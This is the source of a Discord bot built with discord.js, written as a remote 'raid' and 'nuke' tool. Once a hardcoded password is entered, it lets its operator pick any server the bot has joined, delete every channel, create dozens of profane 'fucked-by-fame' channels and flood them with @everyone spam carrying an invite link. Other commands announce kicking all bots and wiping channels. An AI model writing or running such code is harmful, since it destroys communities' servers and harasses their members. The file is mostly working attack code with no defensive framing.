const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  MessageFlags
} = require('discord.js');

const express = require('express');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';
const NUKE_PASSWORD = 'meka123';

const userSessions = new Map();

const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

const TOKEN = process.env.TOKEN;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);
});

// ====================== MESSAGE COMMANDS ======================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  if (content === '!movebootser') {
    const embed = new EmbedBuilder()
      .setColor('#ff00ff')
      .setTitle('🔄 !MOVEBOOT SER')
      .setDescription('This will move the Booster role underneath role ID `1513349804141445120`.')
      .setFooter({ text: 'Click below' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`movebootser_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }

  if (content === '!nukeback') {
    const embed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle('☢️ NUKE SERVER')
      .setDescription('This will **delete all channels and categories** and create a single channel called `chat`.\n\n**This action is irreversible!**')
      .setFooter({ text: 'Only use if you know what you\'re doing' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`nukeback_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Danger)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }

  if (content === '!ate') {
    const embed = new EmbedBuilder()
      .setColor('#ff8800')
      .setTitle('👢 KICK ALL BOTS')
      .setDescription('This will kick every bot from the server (except this one).')
      .setFooter({ text: 'Click below' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`ate_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Danger)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }

  if (content === '!check') {
    const embed = new EmbedBuilder()
      .setColor('#00ff00')
      .setTitle('🔍 Remote Server Control')
      .setDescription('Select any server the bot is in and perform **Raid** or **Nuke**.\n\nPassword required.')
      .setFooter({ text: 'Only you can use this' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`check_start_${message.author.id}`)
        .setLabel('Start')
        .setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
});

// ====================== INTERACTIONS ======================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const userIdFromId = parts[parts.length - 1];

    if (interaction.user.id !== userIdFromId) {
      return interaction.reply({ 
        content: '❌ This interaction belongs to someone else.', 
        flags: MessageFlags.Ephemeral 
      });
    }

    // ====================== CHECK REMOTE NUKE (FIXED) ======================
    if (action === 'check') {
      if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
        const modal = new ModalBuilder()
          .setCustomId(`check_modal_${interaction.user.id}`)
          .setTitle('Enter Password');
        modal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('password')
            .setLabel('Password')
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
        ));
        return await interaction.showModal(modal);
      }

      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
        const password = interaction.fields.getTextInputValue('password');
        if (password !== MAIN_PASSWORD) {
          return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });
        }

        const guilds = Array.from(client.guilds.cache.values());
        if (guilds.length === 0) return interaction.reply({ content: '❌ Bot is not in any servers.', flags: MessageFlags.Ephemeral });

        const options = guilds.map(g => ({
          label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
          value: g.id,
          description: `${g.memberCount} members`
        }));

        const select = new StringSelectMenuBuilder()
          .setCustomId(`check_server_select_${interaction.user.id}`)
          .setPlaceholder('Select target server')
          .addOptions(options);

        await interaction.reply({
          content: '✅ Password accepted. Select a server:',
          components: [new ActionRowBuilder().addComponents(select)],
          flags: MessageFlags.Ephemeral
        });

        userSessions.set(interaction.user.id, {});
      }

      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
        const selectedGuildId = interaction.values[0];
        const guild = client.guilds.cache.get(selectedGuildId);
        if (!guild) return interaction.reply({ content: '❌ Server not found.', flags: MessageFlags.Ephemeral });

        userSessions.set(interaction.user.id, { guildId: selectedGuildId });

        const actionSelect = new StringSelectMenuBuilder()
          .setCustomId(`check_action_select_${interaction.user.id}`)
          .setPlaceholder('Choose action')
          .addOptions([
            { label: '🔥 Raid', value: 'raid' },
            { label: '☢️ Nuke', value: 'nuke' }
          ]);

        await interaction.update({
          content: `**Selected:** ${guild.name}\nChoose action:`,
          components: [new ActionRowBuilder().addComponents(actionSelect)]
        });
      }

      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
        const selectedAction = interaction.values[0];
        const session = userSessions.get(interaction.user.id);
        if (!session?.guildId) return;

        if (selectedAction === 'raid') {
          const modal = new ModalBuilder()
            .setCustomId(`check_raid_modal_${interaction.user.id}`)
            .setTitle('Raid Message');
          modal.addComponents(new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId('raid_message')
              .setLabel('Message to spam')
              .setStyle(TextInputStyle.Paragraph)
              .setRequired(true)
              .setMaxLength(1800)
          ));
          return await interaction.showModal(modal);
        }

        if (selectedAction === 'nuke') {
          const modal = new ModalBuilder()
            .setCustomId(`check_nuke_modal_${interaction.user.id}`)
            .setTitle('Confirm Nuke');
          modal.addComponents(new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId('password')
              .setLabel('Nuke Password')
              .setStyle(TextInputStyle.Short)
              .setRequired(true)
          ));
          return await interaction.showModal(modal);
        }
      }

      // ==================== FIXED NUKE ====================
      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
        const password = interaction.fields.getTextInputValue('password');
        if (password !== NUKE_PASSWORD) {
          return interaction.reply({ content: '❌ Wrong nuke password.', flags: MessageFlags.Ephemeral });
        }

        const session = userSessions.get(interaction.user.id);
        const guild = client.guilds.cache.get(session?.guildId);
        if (!guild) return interaction.reply({ content: '❌ Session expired.', flags: MessageFlags.Ephemeral });

        await interaction.reply({ 
          content: `☢️ **Starting full nuke on ${guild.name}...**`, 
          flags: MessageFlags.Ephemeral 
        });

        try {
          await interaction.followUp({ content: '🗑️ Deleting all channels...', flags: MessageFlags.Ephemeral });

          // Delete all channels
          for (const channel of guild.channels.cache.values()) {
            await channel.delete().catch(() => {});
          }

          await interaction.followUp({ content: '🔨 Creating FUCKED BY FAME channels...', flags: MessageFlags.Ephemeral });

          const createdChannels = [];
          const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

          for (let i = 0; i < 50; i++) {  // Reduced to 50 + delay to avoid rate limits
            try {
              const newChan = await guild.channels.create({
                name: `fucked-by-fame`,
                type: 0,
                reason: 'Nuke by Fame'
              });
              createdChannels.push(newChan);
              await delay(800); // Important delay
            } catch (e) {
              console.error("Channel creation limit:", e.message);
              break;
            }
          }

          await interaction.followUp({ content: `💥 Spamming in ${createdChannels.length} channels...`, flags: MessageFlags.Ephemeral });

          const invite = 'https://discord.gg/NANQMy3WnD';
          const spamMsg = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;

          for (const channel of createdChannels) {
            for (let i = 0; i < 12; i++) {
              channel.send(spamMsg).catch(() => {});
              if (i % 3 === 0) await delay(300);
            }
          }

          // Heavy spam in last channel
          if (createdChannels.length > 0) {
            const lastChannel = createdChannels[createdChannels.length - 1];
            for (let i = 0; i < 25; i++) {
              lastChannel.send(`@everyone **BET$ UNLOCKED FAME** ${invite}`).catch(() => {});
            }
          }

          await interaction.followUp({ 
            content: `✅ **NUKE COMPLETE**\n• Created **${createdChannels.length}** channels named \`fucked-by-fame\`\n• Spamming @everyone + invite`, 
            flags: MessageFlags.Ephemeral 
          });

        } catch (err) {
          console.error(err);
          await interaction.followUp({ content: '⚠️ Nuke partially failed (rate limits).', flags: MessageFlags.Ephemeral });
        }

        userSessions.delete(interaction.user.id);
      }
    }

    // Keep other commands (movebootser, nukeback, ate) unchanged...

  } catch (error) {
    console.error('Interaction error:', error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ content: '❌ Something went wrong.', flags: MessageFlags.Ephemeral }).catch(() => {});
    }
  }
});

client.login(TOKEN);
